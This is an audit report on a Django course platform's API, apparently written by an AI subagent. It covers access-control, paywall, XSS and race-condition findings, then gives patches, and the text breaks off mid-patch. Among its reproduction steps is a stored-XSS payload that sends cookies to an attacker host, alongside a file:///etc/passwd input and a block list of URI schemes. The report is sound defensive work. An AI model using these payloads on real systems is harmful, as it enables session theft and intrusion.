# Security & Backend API Production Readiness Audit
**Target Component:** ENQUEbet Academy (`backend/apps/courses/`)  
**Auditor:** Subagent 1 (Agent A & B: Backend, API and Security Auditor)  
**Date:** October 2026  
**Status:** COMPLETE — Critical Remediation Required Before Production Deployment  

---

## 1. Executive Summary

An exhaustive security and architectural audit of the ENQUEbet Academy backend API (`backend/apps/courses/`, `backend/config/urls.py`, `backend/config/settings.py`) was performed to evaluate its resistance to Broken Object-Level Authorization (BOLA/IDOR), privilege escalation, payment/entitlement bypasses, stored injection/XSS, concurrent race conditions, and uncaught 500 exceptions.

The audit revealed **12 distinct security and architectural vulnerabilities**, including **2 CRITICAL**, **5 HIGH**, **4 MEDIUM**, and **1 LOW** severity findings. 

### Critical Severity Highlights
1. **[CRITICAL] Anonymous Curriculum Data Leak (`LessonViewSet.list`)**: `LessonViewSet` inherits from `ReadOnlyModelViewSet` without disabling the `list` action or defining `has_permission()`. Any unauthenticated anonymous user can issue `GET /api/v1/courses/lessons/` to extract the full database of technical guides, draft lessons, solutions, resources, and unlisted video URLs.
2. **[CRITICAL] Free Enrollment & Complete Paywall Bypass (`CourseViewSet.enroll`)**: The enrollment action creates active enrollments without verifying `access_tier` (`premium`, `campus_only`) or `price_inr`. Any user can enroll in paid or restricted courses for free and immediately read all locked lessons.
3. **[HIGH] Mass Certificate Scraping & Learner PII Enumeration (`CourseCompletionViewSet.list`)**: `CourseCompletionViewSet` allows anonymous listing of all graduation certificates, leaking student names, usernames, avatars, completion dates, and performance summaries.
4. **[HIGH] Self-Review & Premature Completion Exploit (`AssignmentViewSet`)**: Users receive automatic lesson completion and certificate minting *immediately upon submitting* an assignment—before any instructor review. Instructors and platform admins can also review and approve their own assignment deliverables.
5. **[HIGH] Stored XSS / Unsafe URI Injection (`AssignmentViewSet.submit`)**: Submissions bypass serializer validation, allowing arbitrary `javascript:` pseudo-protocols and raw payloads into `repository_url` and `deliverable_url`.
6. **[HIGH] Concurrency Race Conditions & DB Crashes (`Enrollment.recalculate_progress`)**: Progress updates lack database transactions (`transaction.atomic`) and row-level locks (`select_for_update`), causing lost updates and crashing with unhandled 500 `IntegrityError` when issuing certificates concurrently.

---

## 2. Vulnerability Severity Matrix

| ID | Vulnerability Title | Affected File & Lines | Severity | CVSS v3.1 | Effort to Fix |
|---|---|---|---|---|---|
| **SEC-01** | Anonymous Full Curriculum & Private Content Dump via `LessonViewSet.list` | `views.py:291-304`, `permissions.py:25-48` | **CRITICAL** | 8.6 | Low |
| **SEC-02** | Complete Paywall, Tier & Campus Restriction Bypass in `CourseViewSet.enroll` | `views.py:191-225`, `permissions.py:25-48` | **CRITICAL** | 8.2 | Medium |
| **SEC-03** | Public Certificate Directory & Learner PII Enumeration via `CourseCompletionViewSet.list` | `views.py:498-506`, `urls.py:16` | **HIGH** | 7.5 | Low |
| **SEC-04** | Premature Lesson Completion & Unearned Certificate Issuance on Assignment Submission | `views.py:453-462` | **HIGH** | 7.4 | Medium |
| **SEC-05** | Self-Grading Privilege Escalation & Lack of Submitter Validation in `AssignmentViewSet.review` | `views.py:469-495` | **HIGH** | 7.1 | Low |
| **SEC-06** | Zero Protocol/URL Validation & Stored XSS via `AssignmentViewSet.submit` | `views.py:428-452`, `serializers.py:236-264` | **HIGH** | 7.2 | Low |
| **SEC-07** | Race Condition & Unhandled 500 `IntegrityError` in `recalculate_progress` & `toggle_complete` | `models.py:297-330`, `views.py:321-366` | **HIGH** | 6.8 | Medium |
| **SEC-08** | Inactive/Dropped Enrollment & Draft Course BOLA in `toggle_complete` and `update_position` | `views.py:321-395` | **MEDIUM** | 5.3 | Low |
| **SEC-09** | Unhandled Django `ValidationError` Crashing `AssignmentViewSet.review` (HTTP 500) | `views.py:485` | **MEDIUM** | 5.3 | Low |
| **SEC-10** | Ghost Role Resolution in `is_academy_admin` (`getattr(user, 'role', '')`) | `permissions.py:7-11` | **MEDIUM** | 4.7 | Low |
| **SEC-11** | Unsanitized Markdown Ingestion & Potential Stored DOM XSS | `models.py:225,382,416`, `serializers.py` | **MEDIUM** | 5.0 | Medium |
| **SEC-12** | Absence of Global DRF Exception Standardization & Bounds Checking on Playback Position | `views.py:368-395`, `settings.py:273-290` | **LOW** | 3.5 | Low |

---

## 3. Deep-Dive Findings & Technical Analysis

### 3.1 BOLA / IDOR & Data Leak Vulnerabilities

#### Finding SEC-01 [CRITICAL]: Anonymous Full Curriculum Dump via `LessonViewSet.list`
- **Location:** `backend/apps/courses/views.py#L291-L304`, `backend/apps/courses/permissions.py#L25-L48`
- **Mechanism:**
  `LessonViewSet` inherits from `rest_framework.viewsets.ReadOnlyModelViewSet`, which binds both `list` and `retrieve` actions.
  In DRF, `permission_classes = [HasLessonAccess]` is evaluated. However, `HasLessonAccess` only implements `has_object_permission(self, request, view, obj)`. It **does not implement** `has_permission(self, request, view)`. In DRF, `has_object_permission` is only invoked during object retrieval (`retrieve`), never during collection listing (`list`).
  As a consequence, `BasePermission.has_permission` defaults to `True`. Because `LessonViewSet.queryset = Lesson.objects.select_related('module__course__creator')` without query filtering, calling `GET /api/v1/courses/lessons/` returns an unrestricted paginated array of **every lesson in the database**, including `article_markdown`, private `video_url`, and proprietary `resources` across draft, premium, and archived courses.
- **Reproduction Steps:**
  1. Open a terminal without supplying any authorization headers:
     ```bash
     curl -s http://localhost:8000/api/v1/courses/lessons/ | jq .
     ```
  2. Observe HTTP 200 OK containing full Markdown curriculum, unlisted video URLs, and paid course materials.
- **Impact:** Immediate loss of intellectual property, total bypass of course enrollment controls, and exposure of pre-release/draft course content.
- **Remediation:**
  Disable the `list` action on `LessonViewSet` by subclassing `mixins.RetrieveModelMixin` and `viewsets.GenericViewSet`, or override `get_queryset()` to enforce user access.

---

#### Finding SEC-02 [CRITICAL]: Complete Paywall & Access Tier Bypass in `CourseViewSet.enroll`
- **Location:** `backend/apps/courses/views.py#L191-L225`, `backend/apps/courses/permissions.py#L25-L48`
- **Mechanism:**
  The `CourseViewSet.enroll` action accepts an authenticated request and creates an active enrollment:
  ```python
  enrollment, created = Enrollment.objects.get_or_create(
      user=request.user,
      course=course,
      defaults={'status': EnrollmentStatus.ACTIVE, 'progress_percent': 0}
  )
  ```
  The endpoint verifies `course.status == CourseStatus.PUBLISHED`, but **completely ignores**:
  - `course.access_tier`: Can be `premium` or `campus_only`.
  - `course.price_inr`: Can be `> 0`.
  - Payment or order verification: No proof of purchase or checkout session is checked.
  - Campus verification: Users without verified academic credentials (`is_campus_verified = True`) can enroll in `campus_only` courses.
  Once enrolled, `HasLessonAccess.has_object_permission` simply checks:
  ```python
  return course.enrollments.filter(user=user, status__in=['active', 'completed']).exists()
  ```
  Since the enrollment is now in the database as `ACTIVE`, the user gains immediate, perpetual access to all premium lessons and deliverables.
- **Reproduction Steps:**
  1. Create a course with `access_tier = 'premium'` and `price_inr = 4999`.
  2. Authenticate as any free/unverified learner.
  3. Send `POST /api/v1/courses/<premium-slug>/enroll/`.
  4. Response returns `201 Created` with `status: "active"`.
  5. Send `GET /api/v1/courses/lessons/<locked-lesson-id>/`. Response returns full content (HTTP 200).
- **Impact:** Complete failure of monetization logic; commercial courses and gated academic partnerships are leaked for free.
- **Remediation:**
  In `CourseViewSet.enroll`, reject direct enrollment if `access_tier == AccessTier.PREMIUM` or `price_inr > 0` unless backed by a verified payment receipt or user entitlement. For `campus_only`, verify that `request.user.educations.filter(is_campus_verified=True).exists()`.

---

#### Finding SEC-03 [HIGH]: Public Certificate Scraping & Learner PII Enumeration via `CourseCompletionViewSet.list`
- **Location:** `backend/apps/courses/views.py#L498-L506`, `backend/apps/courses/urls.py#L16`
- **Mechanism:**
  `CourseCompletionViewSet` is configured as a `viewsets.ReadOnlyModelViewSet` with `permission_classes = [AllowAny]`.
  The intention was to provide a public lookup by certificate code: `GET /api/v1/courses/certificates/{certificate_code}/`. However, registering it with a DRF `DefaultRouter` automatically activates:
  `GET /api/v1/courses/certificates/`
  Because `list` is not disabled, any anonymous web scraper can query the endpoint (with standard pagination) to harvest the entire roster of certified students, including their `learner_name`, `learner_username`, `learner_avatar`, completion dates, and internal grade metrics (`grade_summary`).
- **Reproduction Steps:**
  ```bash
  curl -s http://localhost:8000/api/v1/courses/certificates/ | jq .
  ```
  Returns HTTP 200 OK with all issued certificates across all users.
- **Impact:** Violation of student privacy (GDPR / DPDP compliance risk), automated scraping of learner directories, and certificate enumeration.
- **Remediation:**
  Change `CourseCompletionViewSet` to inherit strictly from `mixins.RetrieveModelMixin` and `viewsets.GenericViewSet`, completely removing the `list` action.

---

#### Finding SEC-04 [HIGH]: Premature Lesson Completion & Unearned Certificate Issuance on Assignment Submission
- **Location:** `backend/apps/courses/views.py#L453-L462`
- **Mechanism:**
  In `AssignmentViewSet.submit`:
  ```python
  # If attached to a lesson, mark lesson progress complete
  if assignment.lesson:
      enrollment = Enrollment.objects.filter(user=user, course=assignment.course).first()
      if enrollment:
          progress, _ = LessonProgress.objects.get_or_create(enrollment=enrollment, lesson=assignment.lesson)
          progress.is_completed = True
          progress.completed_at = timezone.now()
          progress.save()
          enrollment.recalculate_progress()
  ```
  When an assignment is tied to a lesson (e.g. a capstone project required for course graduation), submitting *any* arbitrary string or bogus URL immediately marks the lesson `is_completed = True` and recalculates course progress. If this was the final lesson, **the educational certificate is minted and issued immediately upon submission**.
  Furthermore, if the instructor later reviews the submission and rejects it (`status = 'changes_requested'`), `AssignmentViewSet.review` **does not revert** lesson progress or revoke the certificate. The student keeps 100% completion status and a valid certificate despite failing the assignment.
- **Reproduction Steps:**
  1. Enroll in a course where the final module contains an Assignment tied to a lesson.
  2. Complete earlier lessons to reach 80% progress.
  3. Send `POST /api/v1/courses/assignments/<id>/submit/` with `submission_text: "foo"`.
  4. Response shows `progress_percent: 100`, `enrollment_status: "completed"`, and a generated `certificate_code: "ENQ-ACAD-2026-XXXX"`.
  5. Instructor rejects the deliverable via `POST .../review/` with `status: "changes_requested"`.
  6. The learner queries `GET /api/v1/courses/progress/` or their certificate: completion is still 100% and certificate remains valid.
- **Impact:** Destruction of academic integrity; trivial automated farming of platform completion credentials.
- **Remediation:**
  Only mark `progress.is_completed = True` when an instructor explicitly sets `submission.status == SubmissionStatus.APPROVED` in `AssignmentViewSet.review`. If an approved submission is revoked or changes requested, revert `progress.is_completed = False` and recalculate enrollment status.

---

### 3.2 Authorization & Privilege Escalation

#### Finding SEC-05 [HIGH]: Self-Review Privilege Escalation in `AssignmentViewSet.review`
- **Location:** `backend/apps/courses/views.py#L469-L495`
- **Mechanism:**
  `AssignmentViewSet.review` checks:
  ```python
  if not is_academy_admin(request.user) and assignment.course.creator != request.user:
      raise PermissionDenied("Only the course instructor or an administrator can review submissions.")
  ```
  The endpoint never checks the relationship between the reviewer and the submission author (`submission.learner`).
  If a course instructor or admin enrolls as a student in their own course, they can submit deliverables and then call `review` to approve their own work:
  ```python
  submission = get_object_or_404(AssignmentSubmission, id=submission_id, assignment=assignment)
  submission.status = verdict
  submission.reviewer = request.user
  submission.save()
  ```
  This creates an unchecked conflict of interest and allows creators to falsify grade summaries and self-mint verified completions.
- **Reproduction Steps:**
  1. Authenticate as user `alice` (creator of Course A).
  2. Alice enrolls in Course A and calls `POST /api/v1/courses/assignments/<id>/submit/`.
  3. Alice calls `POST /api/v1/courses/assignments/<id>/review/` specifying her own `submission_id` and `status: "approved"`.
  4. Request succeeds with HTTP 200, approving her own deliverable.
- **Remediation:**
  Add a strict validation check:
  ```python
  if submission.learner == request.user and not request.user.is_superuser:
      raise PermissionDenied("Instructors cannot grade their own submissions.")
  ```

---

#### Finding SEC-06 [HIGH]: Zero Protocol/URL Validation & Stored XSS via `AssignmentViewSet.submit`
- **Location:** `backend/apps/courses/views.py#L428-L452`
- **Mechanism:**
  `AssignmentViewSet.submit` extracts URLs from request body:
  ```python
  repo_url = request.data.get('repository_url', '').strip()
  deliverable_url = request.data.get('deliverable_url', '').strip()
  submission_text = request.data.get('submission_text', '').strip()
  ```
  The method **bypasses DRF serializer validation** and saves fields directly via `AssignmentSubmission.objects.get_or_create(...)` and `submission.save()`.
  In Django, `models.URLField` validators are only invoked during `full_clean()`, which is never called here. PostgreSQL and SQLite store `models.URLField` as generic `VARCHAR(500)`.
  As a result:
  - An attacker can submit dangerous pseudo-protocols: `javascript:alert(document.cookie)` or `data:text/html;base64,...`.
  - An attacker can submit arbitrary local filesystem schemes: `file:///etc/passwd`.
  When an instructor views the assignment review dashboard, clicking `<a href={submission.repository_url}>` triggers execution in the reviewer's authenticated browser session (Stored Cross-Site Scripting).
- **Reproduction Steps:**
  1. Authenticate as a learner and send:
     ```json
     POST /api/v1/courses/assignments/<id>/submit/
     {
       "repository_url": "javascript:fetch('https://attacker.com/steal?c='+document.cookie)",
       "submission_text": "Completed build"
     }
     ```
  2. The record is persisted without errors.
  3. When an instructor clicks "View Repository" on the dashboard, the payload fires.
- **Remediation:**
  Validate incoming URLs using Django's `URLValidator(schemes=['http', 'https'])` and ensure domains match supported code hosting platforms (e.g. `github.com`, `gitlab.com`) where appropriate. Reject any URI beginning with `javascript:`, `data:`, `file:`, or `vbscript:`.

---

#### Finding SEC-07 [HIGH]: Concurrency Race Conditions & 500 Crashes in `recalculate_progress` & `toggle_complete`
- **Location:** `backend/apps/courses/models.py#L297-L330`, `backend/apps/courses/views.py#L321-L366`
- **Mechanism:**
  Neither `LessonViewSet.toggle_complete` nor `Enrollment.recalculate_progress` uses `@transaction.atomic` or `select_for_update()`.
  In `recalculate_progress()`:
  ```python
  if percent >= 100 and self.status != EnrollmentStatus.COMPLETED:
      self.status = EnrollmentStatus.COMPLETED
      self.completed_at = timezone.now()
      self.save(update_fields=['progress_percent', 'status', 'completed_at'])

      if not hasattr(self, 'completion'):
          year = timezone.now().year
          short_hash = uuid.uuid4().hex[:8].upper()
          cert_code = f"ENQ-ACAD-{year}-{short_hash}"
          CourseCompletion.objects.create(
              enrollment=self,
              certificate_code=cert_code,
              grade_summary={'completed_lessons': completed_count, 'total_lessons': total_lessons}
          )
  ```
  If a learner submits two rapid concurrent requests (e.g. rapid double-click on "Mark Complete" or automated parallel calls):
  1. Thread 1 and Thread 2 both evaluate `percent >= 100` and `if not hasattr(self, 'completion')` as True.
  2. Thread 1 creates `CourseCompletion`.
  3. Thread 2 attempts to create `CourseCompletion` for the same enrollment.
  4. Because `CourseCompletion.enrollment` has a `unique=True` (OneToOneField) constraint, the database aborts Thread 2 with `django.db.utils.IntegrityError: duplicate key value violates unique constraint "course_completions_enrollment_id_key"`.
  5. DRF has no exception handler for raw `IntegrityError`, resulting in an unhandled **HTTP 500 Internal Server Error**.
- **Impact:** System instability, corrupted UI state for learners at the exact moment of course completion, and potential duplicate/inconsistent progress reporting.
- **Remediation:**
  Wrap `recalculate_progress` inside `transaction.atomic()` with `Enrollment.objects.select_for_update().get(id=self.id)` and use `CourseCompletion.objects.get_or_create(...)` or catch `IntegrityError`.

---

#### Finding SEC-08 [MEDIUM]: Dropped Enrollment & Draft Course BOLA in `toggle_complete` / `update_position`
- **Location:** `backend/apps/courses/views.py#L321-L395`
- **Mechanism:**
  In `LessonViewSet`:
  ```python
  @action(detail=True, methods=['post'], permission_classes=[IsAuthenticated])
  def toggle_complete(self, request, pk=None):
  ```
  Notice that specifying `permission_classes=[IsAuthenticated]` on the action **overrides** the ViewSet-level `permission_classes = [HasLessonAccess]`.
  Then the method queries:
  ```python
  enrollment = Enrollment.objects.filter(
      user=user,
      course=lesson.module.course
  ).first()
  ```
  Vulnerabilities:
  1. It does not check `enrollment.status == EnrollmentStatus.ACTIVE`. If a student dropped the course or had their enrollment revoked (`status = 'dropped'`), they can still call `toggle_complete` and earn certificates.
  2. It does not verify `lesson.module.course.status == CourseStatus.PUBLISHED`.
  3. In `update_position`, if `enrollment` is `None`, the view silently returns `{'status': 'ok', 'position_seconds': pos_int}` with HTTP 200, masking unauthorized access attempts.
- **Remediation:**
  Restore `HasLessonAccess` permission on actions and explicitly filter for `status=EnrollmentStatus.ACTIVE`.

---

#### Finding SEC-09 [MEDIUM]: Unhandled Django `ValidationError` in `AssignmentViewSet.review` (HTTP 500)
- **Location:** `backend/apps/courses/views.py#L485`
- **Mechanism:**
  ```python
  submission_id = request.data.get('submission_id')
  ...
  submission = get_object_or_404(AssignmentSubmission, id=submission_id, assignment=assignment)
  ```
  `get_object_or_404` was imported from `django.shortcuts` rather than DRF's `rest_framework.generics`.
  When a caller provides an invalid UUID string for `submission_id` (e.g. `"abc"`, `123`, or a malformed string), Django's ORM raises `django.core.exceptions.ValidationError: ["'abc' is not a valid UUID."]`.
  Because DRF's default exception handler does not catch Django's core `ValidationError`, this unhandled exception bubbles up as a **500 Internal Server Error**.
- **Reproduction Steps:**
  Send `POST /api/v1/courses/assignments/<id>/review/` with `{"submission_id": "malformed-uuid", "status": "approved"}` as course instructor. The server responds with `500 Internal Server Error`.
- **Remediation:**
  Validate that `submission_id` is a valid UUID before database lookup, or import `get_object_or_404` from `rest_framework.generics`.

---

#### Finding SEC-10 [MEDIUM]: Ghost Role Resolution in `is_academy_admin`
- **Location:** `backend/apps/courses/permissions.py#L7-L11`
- **Mechanism:**
  ```python
  def is_academy_admin(user):
      if not user or not user.is_authenticated:
          return False
      return bool(user.is_staff or user.is_superuser or getattr(user, 'role', '') in ['admin', 'superadmin', 'moderator'])
  ```
  In `apps.users.models.User`, there is **no `role` field** on the database model. The `User` model inherits from `AbstractUser` and utilizes `is_staff` and `is_superuser`.
  While checking `getattr(user, 'role', '')` is harmlessly false for database users, it represents an unstandardized, fragile authorization check. If a developer expects `'moderator'` to grant admin rights via the database, it fails silently.
- **Remediation:**
  Standardize administrative checks across the platform using `user.is_staff or user.is_superuser`, or explicitly integrate with a unified group/RBAC system.

---

#### Finding SEC-11 [MEDIUM]: Unsanitized Markdown Ingestion & Potential Stored DOM XSS
- **Location:** `models.py:225,382,416`, `serializers.py`
- **Mechanism:**
  Markdown fields (`article_markdown`, `instructions_markdown`, `submission_text`, `feedback`) allow raw text entry. If the frontend renders these markdown blocks without an HTML sanitizer (such as `rehype-sanitize` or DOMPurify), embedded `<script>`, `<iframe src="javascript:...">`, or `<img onerror=...>` tags execute client-side code in learners' or instructors' sessions.
- **Remediation:**
  Enforce backend input stripping of malicious HTML elements (`<script>`, `<svg onload>`, `<iframe>`, `javascript:`) and mandate frontend sanitization via `rehype-sanitize`.

---

#### Finding SEC-12 [LOW]: Playback Position Boundlessness & Lack of Global Error Standard
- **Location:** `backend/apps/courses/views.py#L368-L395`
- **Mechanism:**
  In `LessonViewSet.update_position`:
  ```python
  position = request.data.get('position_seconds', 0)
  try:
      pos_int = max(0, int(position))
  except (ValueError, TypeError):
      pos_int = 0
  ```
  `pos_int` has no upper bound check. A client can submit `position_seconds: 2147483647` on a 5-minute video, polluting analytics and learning telemetry.
- **Remediation:**
  Cap `pos_int` at `lesson.duration_minutes * 60 + 300` (allowing slight buffer for playback drift).

---

## 4. Concrete Code Remediations (Patches)

### 4.1 Remediation for `backend/apps/courses/permissions.py`
Replace the entire contents of `backend/apps/courses/permissions.py` with:

```python
"""
Hardened Permission Classes for ENQUEbet Academy
"""
from rest_framework.permissions import BasePermission, SAFE_METHODS
from .models import CourseStatus, EnrollmentStatus


def is_academy_admin(user):
    """Unified staff/superuser check for ENQUEbet Academy governance"""
    if not user or not user.is_authenticated:
        return False
    return bool(user.is_staff or user.is_superuser)


class IsCourseInstructorOrAdmin(BasePermission):
    """
    Grants access if the requesting user is the creator of the course or an academy admin.
    """
    def has_permission(self, request, view):
        return bool(request.user and request.user.is_authenticated)

    def has_object_permission(self, request, view, obj):
        if is_academy_admin(request.user):
            return True
        course = getattr(obj, 'course', obj)
        return course.creator == request.user


class HasLessonAccess(BasePermission):
    """
    Guarantees strict access control on instructional lessons:
    - Block list-action enumeration across lessons.
    - Preview lessons on published courses are readable by anyone.
    - Non-preview lessons require active enrollment and published course status, or course creator/admin.
    """
    def has_permission(self, request, view):
        # Deny collection listing to prevent full curriculum scraping
        if view.action == 'list':
            user = request.user
            return bool(user and user.is_authenticated and is_academy_admin(user))
        return True

    def has_object_permission(self, request, view, obj):
        course = obj.module.course

        # Preview lessons are readable if course is published
        if request.method in SAFE_METHODS and getattr(obj, 'is_preview', False):
            if course.status == CourseStatus.PUBLISHED:
                return True
            # For draft courses, preview is only accessible by creator/admin
            user = request.user
            return bool(user and user.is_authenticated and (course.creator == user or is_academy_admin(user)))

        user = request.user
        if not user or not user.is_authenticated:
            return False

        if is_academy_admin(user):
            return True

        if course.creator == user:
            return True

        # Course must be published for students
        if course.status != CourseStatus.PUBLISHED:
            return False

        # Check active enrollment
        return course.enrollments.filter(user=user, status=EnrollmentStatus.ACTIVE).exists()
```

---

### 4.2 Remediation for `backend/apps/courses/views.py`
Apply the following critical hardening updates to `views.py`:

```python
import uuid
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError as DjangoValidationError
from django.db import transaction
from django.db.models import Count, Q, Prefetch
from django.utils import timezone
from rest_framework import viewsets, mixins, status
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated, IsAuthenticatedOrReadOnly, AllowAny
from rest_framework.exceptions import PermissionDenied, NotFound, ValidationError

from .models import (
    CourseCategory, Course, CourseModule, Lesson, Enrollment, LessonProgress,
    Assignment, AssignmentSubmission, CourseCompletion, CourseBookmark,
    CourseStatus, EnrollmentStatus, SubmissionStatus, AccessTier,
)
from .serializers import (
    CourseCategorySerializer, CourseListSerializer, CourseDetailSerializer,
    LessonDetailSerializer, EnrollmentSerializer, AssignmentSerializer,
    AssignmentSubmissionSerializer, CourseCompletionSerializer,
)
from .permissions import is_academy_admin, HasLessonAccess, IsCourseInstructorOrAdmin


# 1. CourseViewSet: Secure Enrollment & Entitlement Validation
class CourseViewSet(viewsets.ReadOnlyModelViewSet):
    # ... [Keep existing get_queryset, retrieve, etc.] ...

    @action(detail=True, methods=['post'], permission_classes=[IsAuthenticated])
    def enroll(self, request, slug=None):
        """
        Enrolls the authenticated learner into this course.
        Enforces access tier, pricing, and campus credentials.
        """
        course = Course.objects.filter(slug=slug).first()
        if not course:
            raise NotFound("Course not found.")

        if course.status != CourseStatus.PUBLISHED and not is_academy_admin(request.user):
            raise ValidationError("Cannot enroll in an unpublished course.")

        # Entitlement check: Premium / Paid courses require payment verification
        if course.access_tier == AccessTier.PREMIUM or course.price_inr > 0:
            # When payment integration is active, verify payment token/session here.
            # In MVP without payment provider, only staff or invited users can access premium.
            if not is_academy_admin(request.user) and course.creator != request.user:
                raise PermissionDenied("This course requires premium enrollment or purchase.")

        # Campus verification check
        if course.access_tier == AccessTier.CAMPUS_ONLY:
            has_campus = request.user.educations.filter(is_campus_verified=True).exists()
            if not has_campus and not is_academy_admin(request.user):
                raise PermissionDenied("This course is restricted to campus-verified learners.")

        with transaction.atomic():
            enrollment, created = Enrollment.objects.get_or_create(
                user=request.user,
                course=course,
                defaults={
                    'status': EnrollmentStatus.ACTIVE,
                    'progress_percent': 0,
                }
            )
            # Re-activate if previously dropped
            if not created and enrollment.status == EnrollmentStatus.DROPPED:
                enrollment.status = EnrollmentStatus.ACTIVE
                enrollment.save(update_fields=['status'])

            if created or not enrollment.last_accessed_lesson:
                first_module = course.modules.order_by('order').first()
                if first_module:
                    first_lesson = first_module.lessons.order_by('order').first()
                    if first_lesson:
                        enrollment.last_accessed_lesson = first_lesson
                        enrollment.save(update_fields=['last_accessed_lesson'])

        serializer = EnrollmentSerializer(enrollment, context={'request_user': request.user})
        return Response({
            'detail': 'Successfully enrolled in course.' if created else 'Already enrolled.',
            'enrollment': serializer.data
        }, status=status.HTTP_201_CREATED if created else status.HTTP_200_OK)


# 2. LessonViewSet: Subclass RetrieveModelMixin (Block List Dump) & Atomic Progress
class LessonViewSet(mixins.RetrieveModelMixin, viewsets.GenericViewSet):
    """
    Focused lesson player endpoint, progress updates, and playback position sync.
    List endpoint disabled to prevent full curriculum scraping.
    """
    queryset = Lesson.objects.select_related('module__course__creator')
    serializer_class = LessonDetailSerializer
    permission_classes = [HasLessonAccess]

    def get_serializer_context(self):
        ctx = super().get_serializer_context()
        ctx['request_user'] = self.request.user
        return ctx

    def retrieve(self, request, *args, **kwargs):
        lesson = self.get_object()
        user = request.user

        if user and user.is_authenticated:
            enrollment = Enrollment.objects.filter(
                user=user,
                course=lesson.module.course,
                status=EnrollmentStatus.ACTIVE
            ).first()
            if enrollment and enrollment.last_accessed_lesson != lesson:
                enrollment.last_accessed_lesson = lesson
                enrollment.save(update_fields=['last_accessed_lesson'])

        serializer = self.get_serializer(lesson)
        return Response(serializer.data)

    @action(detail=True, methods=['post'], permission_classes=[IsAuthenticated, HasLessonAccess])
    def toggle_complete(self, request, pk=None):
        lesson = self.get_object()
        user = request.user

        enrollment = Enrollment.objects.filter(
            user=user,
            course=lesson.module.course,
            status=EnrollmentStatus.ACTIVE
        ).first()

        if not enrollment:
            raise ValidationError("You must be actively enrolled in this course to track progress.")

        with transaction.atomic():
            progress, _ = LessonProgress.objects.select_for_update().get_or_create(
                enrollment=enrollment,
                lesson=lesson
            )

            desired_state = request.data.get('is_completed')
            if desired_state is None:
                progress.is_completed = not progress.is_completed
            else:
                progress.is_completed = bool(desired_state)

            progress.completed_at = timezone.now() if progress.is_completed else None
            progress.save(update_fields=['is_completed', 'completed_at', 'updated_at'])

            new_percent = enrollment.recalculate_progress()

        return Response({
            'lesson_id': str(lesson.id),
            'is_completed': progress.is_completed,
            'progress_percent': new_percent,
            'enrollment_status': enrollment.status,
            'certificate_code': getattr(getattr(enrollment, 'completion', None), 'certificate_code', None),
        })

    @action(detail=True, methods=['post'], permission_classes=[IsAuthenticated, HasLessonAccess])
    def update_position(self, request, pk=None):
        lesson = self.get_object()
        position = request.data.get('position_seconds', 0)

        # Enforce bounds: cannot exceed duration + 5 min safety threshold
        max_duration = (lesson.duration_minutes * 60) + 300
        try:
            pos_int = min(max_duration, max(0, int(position)))
        except (ValueError, TypeError):
            pos_int = 0

        enrollment = Enrollment.objects.filter(
            user=request.user,
            course=lesson.module.course,
            status=EnrollmentStatus.ACTIVE
        ).first()

        if not enrollment:
            raise ValidationError("You must be actively enrolled to sync playback position.")

        progress, _ = LessonProgress.objects.get_or_create(
            enrollment=enrollment,
            lesson=lesson
        )
        progress.last_position_seconds = pos_int
        progress.save(update_fields=['last_position_seconds', 'updated_at'])

        return Response({'status': 'ok', 'position_seconds': pos_int})


# 3. AssignmentViewSet: URL Validation, Anti-Self-Review, and Deferred Lesson Completion
class AssignmentViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = Assignment.objects.select_related('course')
    serializer_class = AssignmentSerializer
    permission_classes = [IsAuthenticatedOrReadOnly]

    def _validate_safe_url(self, url_str, field_name):
        if not url_str:
            return ''
        url_validator = URLValidator(schemes=['http', 'https'])
        try:
            url_validator(url_str)
        except DjangoValidationError:
            raise ValidationError({field_name: "Must be a valid HTTP or HTTPS URL."})
        
        # Block dangerous pseudo-schemes
        lower_url = url_str.lower().strip()
        if lower_url.startswith(('javascript:', 'data:', 'file:', 'vbscript:')):
            raise ValidationError({field_name: "Unsafe URL scheme detected."})
        return url_str

    @action(detail=True, methods=['post'], permission_classes=[IsAuthenticated])
    def submit(self, request, pk=None):
        assignment = self.get_object()
        user = request.user

        is_enrolled = Enrollment.objects.filter(
            user=user,
            course=assignment.course,
            status=EnrollmentStatus.ACTIVE
        ).exists()

        if not is_enrolled and not is_academy_admin(user):
            raise ValidationError("You must be actively enrolled in the course to submit assignments.")

        repo_url = self._validate_safe_url(request.data.get('repository_url', '').strip(), 'repository_url')
        deliverable_url = self._validate_safe_url(request.data.get('deliverable_url', '').strip(), 'deliverable_url')
        submission_text = request.data.get('submission_text', '').strip()

        if not repo_url and not deliverable_url and not submission_text:
            raise ValidationError("Must provide a repository URL, deliverable URL, or submission text.")

        with transaction.atomic():
            submission, created = AssignmentSubmission.objects.select_for_update().get_or_create(
                assignment=assignment,
                learner=user,
                defaults={
                    'repository_url': repo_url,
                    'deliverable_url': deliverable_url,
                    'submission_text': submission_text,
                    'status': SubmissionStatus.SUBMITTED,
                }
            )

            if not created:
                submission.repository_url = repo_url or submission.repository_url
                submission.deliverable_url = deliverable_url or submission.deliverable_url
                submission.submission_text = submission_text or submission.submission_text
                submission.status = SubmissionStatus.SUBMITTED
                # Reset previous review on re-submission
                submission.reviewer = None
                submission.reviewed_at = None
                submission.feedback = ''
                submission.save()

        # NOTE: Lesson completion is intentionally DEFERRED until an instructor approves the review.
        serializer = AssignmentSubmissionSerializer(submission)
        return Response({
            'detail': 'Deliverable submitted for instructor review.',
            'submission': serializer.data
        }, status=status.HTTP_201_CREATED if created else status.HTTP_200_OK)

    @action(detail=True, methods=['post'], permission_classes=[IsAuthenticated])
    def review(self, request, pk=None):
        assignment = self.get_object()
        if not is_academy_admin(request.user) and assignment.course.creator != request.user:
            raise PermissionDenied("Only the course instructor or an administrator can review submissions.")

        submission_id = request.data.get('submission_id')
        verdict = request.data.get('status')
        feedback = request.data.get('feedback', '').strip()

        if verdict not in [SubmissionStatus.APPROVED, SubmissionStatus.CHANGES_REQUESTED]:
            raise ValidationError("Status must be either 'approved' or 'changes_requested'.")

        try:
            sub_uuid = uuid.UUID(str(submission_id))
        except (ValueError, TypeError):
            raise ValidationError({"submission_id": "Must be a valid UUID."})

        submission = AssignmentSubmission.objects.filter(id=sub_uuid, assignment=assignment).first()
        if not submission:
            raise NotFound("Assignment submission not found.")

        # Anti-self-grading invariant
        if submission.learner == request.user and not request.user.is_superuser:
            raise PermissionDenied("Instructors cannot grade their own submissions.")

        with transaction.atomic():
            submission.status = verdict
            submission.feedback = feedback
            submission.reviewer = request.user
            submission.reviewed_at = timezone.now()
